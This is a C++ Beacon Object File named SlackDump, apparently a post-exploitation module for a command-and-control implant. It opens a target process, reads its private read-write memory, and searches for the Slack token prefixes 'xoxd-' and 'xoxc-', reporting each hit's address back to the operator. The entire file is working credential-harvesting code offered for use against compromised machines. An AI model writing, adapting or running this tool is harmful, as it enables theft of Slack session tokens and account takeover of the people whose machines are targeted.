#include <General.hpp>

auto SlackDump( ULONG ProcessId ) -> VOID {
    auto ProcessHandle = INVALID_HANDLE_VALUE;
    auto MmAddress     = PBYTE{ nullptr };
    auto MmInformation = MEMORY_BASIC_INFORMATION{ 0 };
    auto PageInterval  = SIZE_T{ 0 };
    auto BooleanStatus = BOOL{ FALSE };
    auto ReadBuffer    = PWCHAR{ nullptr };
    auto BytesRead     = SIZE_T{ 0 };
    
    auto Cleanup = [&]() -> VOID {
        if ( ReadBuffer ) {
            RtlFreeHeap( GetProcessHeap(), 0, ReadBuffer );
            ReadBuffer = nullptr;
        }
        
        if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
            CloseHandle( ProcessHandle );
            ProcessHandle = INVALID_HANDLE_VALUE;
        }
    };
    
    ProcessHandle = OpenProcess( 
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessId 
    );
    if ( ProcessHandle == INVALID_HANDLE_VALUE || ProcessHandle == nullptr ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to open process %d: %d", ProcessId, GetLastError() );
        return;
    }
    
    BeaconPrintf( CALLBACK_OUTPUT, "Scanning process %d for tokens...", ProcessId );
    
    while ( TRUE ) {
        PageInterval = VirtualQueryEx( 
            ProcessHandle, MmAddress, &MmInformation, sizeof( MEMORY_BASIC_INFORMATION ) 
        );
        if ( PageInterval == 0 ) {
            BeaconPrintf( CALLBACK_OUTPUT, "Memory scan complete" ); break; 
        }
        
        MmAddress = static_cast<PBYTE>( MmInformation.BaseAddress ) + MmInformation.RegionSize;
        
        if ( MmInformation.State != MEM_COMMIT ) {
            continue;
        }
        
        if ( MmInformation.Protect != PAGE_READWRITE ) {
            continue;
        }
        
        if ( MmInformation.Type != MEM_PRIVATE ) {
            continue;
        }
        
        if ( MmInformation.RegionSize > 100 * 1024 * 1024 ) { // 100MB
            continue;
        }
        
        if ( ReadBuffer ) {
            Mem::Free( ReadBuffer ); ReadBuffer = nullptr;
        }
        
        ReadBuffer = Mem::Alloc<PWCHAR>( MmInformation.RegionSize );
        if ( ! ReadBuffer ) {
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate memory buffer" ); continue;
        }
        
        BooleanStatus = ReadProcessMemory( 
            ProcessHandle, MmInformation.BaseAddress, ReadBuffer, MmInformation.RegionSize, &BytesRead 
        );
        if ( !BooleanStatus || BytesRead == 0 ) {
            continue; 
        }
        
        PBYTE ByteBuffer = reinterpret_cast<PBYTE>( ReadBuffer );
        
        if ( BytesRead < 5 ) {
            continue;
        }
        
        for ( SIZE_T i = 0; i < BytesRead - 5; i++ ) {
            if ( ByteBuffer[i+0] == 0x78 &&  // 'x'
                 ByteBuffer[i+1] == 0x6f &&  // 'o'
                 ByteBuffer[i+2] == 0x78 &&  // 'x'
                 (ByteBuffer[i+3] == 0x64 || ByteBuffer[i+3] == 0x63) &&  // 'd' ou 'c'
                 ByteBuffer[i+4] == 0x2d ) { // '-'
                
                BeaconPrintf( CALLBACK_OUTPUT, "Pattern found at offset: 0x%p", 
                    reinterpret_cast<PVOID>( reinterpret_cast<SIZE_T>( MmInformation.BaseAddress ) + i )
                );
            }
        }
    }
    
    return Cleanup();
}

EXTERN_C auto go( CHAR* Args, INT32 Argc ) -> VOID {
    Data Parser = { 0 };
    
    BeaconDataParse( &Parser, Args, Argc );
    ULONG ProcessId = BeaconDataInt( &Parser );
    
    if ( ProcessId == 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "Invalid process ID" ); return;
    }
    
    return SlackDump( ProcessId );
}